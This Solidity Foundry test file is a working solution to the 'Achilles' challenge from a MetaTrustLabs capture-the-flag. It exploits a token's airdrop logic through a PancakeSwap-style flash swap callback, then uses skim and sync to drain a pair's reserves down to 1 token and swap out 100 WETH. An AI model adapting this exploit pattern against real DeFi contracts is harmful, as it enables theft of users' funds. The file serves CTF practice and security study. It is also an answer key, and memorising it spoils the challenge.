// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./SetUp.sol";

/// https://github.com/MetaTrustLabs/ctf/tree/master/Achilles
contract AchillesTest is Test {
    SetUp internal _setup;
    address internal immutable _vault = makeAddr("vault");

    function setUp() public {
        _setup = new SetUp();

        vm.roll(18159458);
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        uint256 step = abi.decode(data, (uint256));

        if (step == 1) {
            address to = _getToAddressForAirdrop(sender);

            // sender's achilles balance : 0
            // vault's achilles balance  : amount0
            _setup.achilles().transfer(_vault, amount0);

            // Sets airdropAmount to 1
            _setup.achilles().Airdrop(1);

            // Sets sender's achilles balance to 1 by _airdrop
            _setup.achilles().transfer(to, 0);

            // Returns achilles to pair
            vm.startPrank(_vault);
            _setup.achilles().transfer(address(_setup.pair()), amount0);
            vm.stopPrank();
        } else if (step == 2) {
            _setup.achilles().transfer(address(_setup.pair()), 1);
        }
    }

    function test_attack() public {
        // pair
        // token0              : achilles
        // token1              : weth
        // init balance
        // achilles            : 1000e18
        // weth                : 1000e18

        // Airdrop condition:
        // weth.balanceOf(address(pair)) / achilles.balanceOf(address(pair)) > 5
        _setup.pair().swap(
            _setup.achilles().balanceOf(address(_setup.pair())) - 1,
            0,
            address(this), abi.encode(1)
        );

        address to = _getToAddressForAirdrop(address(_setup.pair()));

        // Sets pair's achilles balance to 1 by _airdrop
        _setup.pair().skim(to);

        // reserve0: 1
        // reserve1: 1000000000000000000000
        _setup.pair().sync();

        _setup.pair().swap(0, 100e18, address(this), abi.encode(2));

        assertTrue(_setup.isSolved());
    }

    function _getToAddressForAirdrop(address from) internal view returns (address) {
        // uint256 seed = (uint160(msg.sender) | block.number) ^ (uint160(from) ^ uint160(to));
        // airdropAddress = address(uint160(seed | tAmount))
        //
        // msg.sender = from
        // tAmount = 0
        // (uint160(from) | block.number) ^ (uint160(from) ^ (uint160(from) | block.number)) = from
        return address(uint160(from) | uint160(block.number));
    }
}
